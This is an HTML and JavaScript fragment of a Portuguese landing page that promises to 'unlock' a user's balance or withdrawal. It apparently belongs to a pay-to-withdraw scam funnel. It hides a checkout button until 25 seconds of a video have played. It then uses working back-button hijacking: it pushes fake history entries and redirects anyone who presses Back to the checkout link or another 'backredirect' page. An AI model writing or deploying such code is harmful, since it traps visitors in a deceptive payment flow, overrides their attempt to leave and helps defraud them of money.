    <h4>DESBLOQUEIO DE SALDO</h4>
    <p>Veja como liberar seu saque assistindo ao vídeo.</p>

   <script src="https://fast.wistia.com/player.js" async></script><script src="https://fast.wistia.com/embed/nw7x8qagxa.js" async type="module"></script><style>wistia-player[media-id='nw7x8qagxa']:not(:defined) { background: center / contain no-repeat url('https://fast.wistia.com/embed/medias/nw7x8qagxa/swatch'); display: block; filter: blur(5px); padding-top:56.25%; }</style> <wistia-player media-id="nw7x8qagxa" aspect="1.7777777777777777"></wistia-player>

    <div id="mensagem" class="mensagemBotao">⚠ O botão para confirmar o saque aparecerá em instantes.</div>

    <div id="botaoDesbloquear" class="centralizar hide">
      <a id="desbloquearLink" href="https://go.masterfy.com.br/joq3xrgrht">
        <button>DESBLOQUEAR AGORA</button>
      </a>
    </div>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      var DELAY_SECONDS = 25; // NOVO TEMPO: 25 segundos
      var CTA_SEL = "#botaoDesbloquear";
      var MSG_SEL = "#mensagem";
      var LOCAL_KEY = "cta_shown_" + DELAY_SECONDS;

      var ctaBox = document.querySelector(CTA_SEL);
      var msgBox = document.querySelector(MSG_SEL);
      var WISTIA_ID = 'nw7x8qagxa'; 
      var timeFired = false;

      function showCTA() {
        if (!ctaBox || ctaBox.dataset.shown === "1") return;
        ctaBox.classList.remove("hide");
        ctaBox.style.display = "flex"; 
        if (msgBox) msgBox.style.display = "none";
        ctaBox.dataset.shown = "1";
        try { localStorage.setItem(LOCAL_KEY, "1"); } catch(e) {}
      }

      // Persistência entre visitas
      try { if (localStorage.getItem(LOCAL_KEY) === "1") showCTA(); } catch(e) {}

      // --- Lógica para o Wistia (Mais confiável) ---
      // O Wistia usa a variável global _wq para garantir que o player esteja pronto
      window._wq = window._wq || [];
      _wq.push({
        id: WISTIA_ID,
        onReady: function(player) {
          if (ctaBox.dataset.shown === "1") return; // Já mostrado via LocalStorage
          
          player.bind('timechange', function(time) {
            var currentTime = Math.floor(time);

            if (!timeFired && currentTime >= DELAY_SECONDS) {
              timeFired = true;
              showCTA();
              // Desvincula o evento para parar de verificar após o CTA aparecer
              player.unbind('timechange'); 
            }
          });
        }
      });

      // --- Propaga parâmetros da URL para o checkout (Mantido) ---
      var urlParams = new URLSearchParams(window.location.search);
      var paramsString = urlParams.toString();
      var desbloquearLink = document.getElementById("desbloquearLink");
      if (desbloquearLink && paramsString) {
        var base = desbloquearLink.href || "";
        desbloquearLink.href = base + (base.includes("?") ? "&" : "?") + paramsString;
      }

      // --- Back redirect do checkout (Mantido) ---
      var checkoutLink = "https://go.masterfy.com.br/joq3xrgrht";
      var redirectUrl = checkoutLink + (checkoutLink.includes("?") ? "&" : "?") + urlParams.toString();

      try {
        history.pushState({}, "", location.href);
        history.pushState({}, "", location.href);
        window.addEventListener("popstate", function () {
          setTimeout(function () { location.href = redirectUrl; }, 1);
        });
      } catch(e) {}
    });
  </script>

  <script>
    // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
    const backLink = 'https://avaliecerto.shop/app/saque/backredirect/';

    function setBackRedirect(url) {
      let urlBackRedirect = url;
      urlBackRedirect =
        urlBackRedirect.trim() +
        (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
        document.location.search.replace('?', '').toString();

      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);

      window.addEventListener('popstate', () => {
        console.log('onpopstate', urlBackRedirect);
        setTimeout(() => {
          location.href = urlBackRedirect;
        }, 1);
      });
    }

    setBackRedirect(backLink);
  </script>
